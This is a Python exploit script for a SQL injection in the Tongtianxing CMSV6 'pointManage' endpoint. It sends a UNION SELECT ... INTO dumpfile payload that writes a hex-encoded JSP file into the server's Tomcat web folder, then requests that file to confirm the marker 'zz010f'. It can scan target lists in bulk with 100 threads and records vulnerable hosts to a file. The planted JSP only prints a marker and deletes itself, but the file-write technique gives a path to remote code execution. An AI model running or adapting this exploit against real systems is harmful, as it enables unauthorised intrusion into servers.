import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    text = '''

   <<<<<<<<通天星CMSV6 pointManage存在SQL注入可写入文件RCE>>>>>>>>>>>

'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="通天星CMSV6 pointManage存在SQL注入可写入文件RCE")
    parser.add_argument('-u','--url',dest='url',type=str,help="please input url")
    parser.add_argument('-f','--file',dest='file',type=str,help="please input your file")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)

    elif not args.url and args.file:
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/point_manage/merge'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = (
        "id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL"
        " INTO dumpfile '../../tomcat/webapps/gpsweb/allgods.jsp' FROM user_session a"
        " WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8"
    )

    try:
        response = requests.post(url=target + payload,headers=headers,data=data,timeout=5,verify=False)
        payload2 = '/allgods.jsp'
        url2 = target + payload2
        response1 = requests.get(url=url2)
        if response.status_code == 200 and response1.status_code == 200 and "zz010f" in response1.text:
            print( f"[+] {target} 存在sql注入漏洞")
            with open('success.txt','a')as f:
                f.write(target+'\n')
        else:
            print("[-] 漏洞不存在!!")
    except Exception as e:
        print(f"[?] 该url出现错误:{target}")


if __name__ == '__main__':
    main()